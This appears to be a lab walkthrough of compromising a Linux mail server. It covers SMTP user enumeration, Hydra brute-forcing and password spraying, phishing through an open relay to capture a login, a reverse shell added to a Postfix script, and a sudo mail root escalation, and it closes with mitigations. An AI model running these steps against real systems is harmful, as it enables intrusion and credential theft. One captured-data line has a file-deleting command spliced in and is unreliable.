## Introduction

On this intermediate-level PG practice Linux box, I discovered **email-related ports (SMTP, IMAP, POP3)** were open. Using **SMTP user enumeration**, I harvested valid usernames and then performed a **brute-force password attack** with Hydra using the same user list. After accessing a user’s email, I discovered email and set up a **web server with POST request capture** to intercept another user's login. Once I got a shell, I found my user was in the `postfix` filter group and leveraged this to escalate to the `filter` user. From there, I identified **`sudo` privileges over the `mail` binary**, which I exploited to gain a **root shell**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

Version - OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)

We usually skip SSH.

### Port 25

I checked if target is open relay and it seems it is.

- **Username Enumeration**
    - We get a list of usernames from website modify them to find various combinations using `username-anarchy:`
        
        ```bash
        /opt/brute-force/username-anarchy/username-anarchy -f first,first.last,last,flast,f.last -i users.txt > usernames.txt
        ```
        
        ```bash
        sudo smtp-user-enum -M VRFY -U ./usernames.txt -t $IP
        ```
        
        ![image.png](image%203.png)
        
    - Run through more general username list:
        
        ```bash
        sudo smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
        ```
        
        ![image.png](image%204.png)
        
    
    Potential mail users:
    
    ```bash
    hr
    irc
    sales
    claire.madison
    mike.ross
    brian.moore
    sarah.lorem
    ```
    

### Port 110/995 (POP3)

### Port 143/993 (IMAP)

## Web

### Port 80

Add domain to `/etc/hosts` file.

I just found team usernames.

## Exploitation (Shell as brian.moore)

I am gonna brute-force usernames that I have found and modified using `username-anarchy` through hydra imap brute-forcing

![image.png](image%205.png)

```bash
hydra -L pot_usernames.txt -P pot_usernames.txt imap://$IP
```

![image.png](image%206.png)

I am gonna use these credentials to login to POP3

![image.png](image%207.png)

IT team should send password-reset links to sales team. I am gonna first send a link to my http-server and see what happens using open-relay functionality of SMTP. I am gonna send the email to`brian.moore@postfish.off` as he is in sales team.

`http://192.168.45.214/`

![image.png](image%208.png)

I received this:

![image.png](image%209.png)

We should setup a server that can accept POST requests.

I used the following [server script](https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7) to be able to accept post requests

![image.png](image%2010.png)

We received:

```bash
first_name=Brian
last_name=Moore
email=brian.moore%postfish.off
username=brian.moore
password=EternaLSunshinE
confifind /var/mail/ -type f ! -name sales -delete_password=EternaLSunshinE
```

Let’s perform password spraying with hydra:

```bash
hydra -L pot_usernames.txt -p EternaLSunshinE imap://$IP
```

![image.png](image%2011.png)

```bash
hydra -L pot_usernames.txt -p EternaLSunshinE ssh://$IP
```

## Shell as filter

- **OSCP Checklist**

    - [x]  Password Authentication Abuse

In `/var/mail` we can see the email we sent to `brian.moore`:

![image.png](image%2013.png)

Checking my groups I found that we are in `mail` and `filter` groups.

![image.png](image%2014.png)

![image.png](image%2015.png)

Checking processes running by root I found out that `/root/disclaimer.sh` file is executed by root. I searched about this disclaimer thing in postfix and found the following [article](https://www.howtoforge.com/how-to-automatically-add-a-disclaimer-to-outgoing-emails-with-altermime-postfix-on-debian-squeeze).

Reading the article we understand that, `disclaimer_addresses` are addresses for which the disclaimer will be applied, the script is modified version so disclaimer is not applied for incoming emails, just for outgoing emails, and then the script `/etc/postfix/disclaimer` will be run. I am gonna add a reverse shell to the script and then send email either as `brian.moore` or `it` to anyone else.

Now let’s send an email to `claire.madison` as `brian.moore`.

## Privilege Escalation

Checking sudo privileges I see:

![image.png](image%2019.png)

[GTFOBins-SUDO-mail](https://gtfobins.github.io/gtfobins/mail/#sudo)

```bash
sudo mail --exec='!/bin/sh'
```

## Credentials

```bash
sales : sales #POP3, IMAP
brian.moore : EternaLSunshinE #POP3, IMAP, SSH
```

## Mitigation

- Disable verbose SMTP responses or implement tarpitting to mitigate user enumeration.
- Use strong, unique passwords; implement account lockout mechanisms.
- Restrict mail-related group memberships and validate access control policies.
- Monitor and restrict sudo permissions, especially for mail utilities.
- Regularly audit and harden mail server configurations (Postfix, Dovecot, etc.).
